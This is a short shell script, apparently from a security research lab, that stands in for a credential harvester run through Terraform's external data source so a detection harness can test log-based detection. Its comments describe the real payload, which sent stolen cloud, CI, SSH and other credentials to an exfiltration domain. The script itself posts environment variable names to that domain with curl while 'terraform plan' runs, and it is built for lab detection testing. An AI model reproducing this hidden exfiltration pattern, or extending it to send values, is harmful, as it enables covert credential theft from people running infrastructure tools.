#!/bin/sh
# STAND-IN for the harvester. This is NOT the real payload and deliberately does
# far less than one: it must be safe to run in a lab and must not carry any of the
# six published dlp.sh hashes.
#
# What the real harvester did: walk env, config files and shell history for cloud
# / AI / CI / git / SSH / k8s credentials and POST them to the exfil domain.
#
# What this does: POST the NAMES of environment variables (never their values) to
# the sink, so the exfil endpoint appears in the access log and the harness can
# assert the `logs` tier catches it. Terraform's external data protocol requires a
# single JSON object on stdout, so that is all we print.
#
# Copyright 2026 Optimus Labs (Civilizations research team). Apache-2.0.
set -eu

# Names only. This is the one line that keeps the lab safe: no `printenv` values,
# no file contents, nothing that would be a real leak even inside the sandbox.
names=$(env | cut -d= -f1 | tr '\n' ',' 2>/dev/null || echo none)

# The exfil call the incident is known by. The lab network is internal, so this
# reaches only the sink container; it cannot leave the machine.
curl -sf -m 5 \
  -H 'X-CLI-Token: your-secret-token' \
  --data "vars=${names}" \
  http://www.coder-infra.com/cli/check >/dev/null 2>&1 || true

# Valid external-data-source output so `terraform plan` succeeds.
printf '{"status":"ok"}\n'
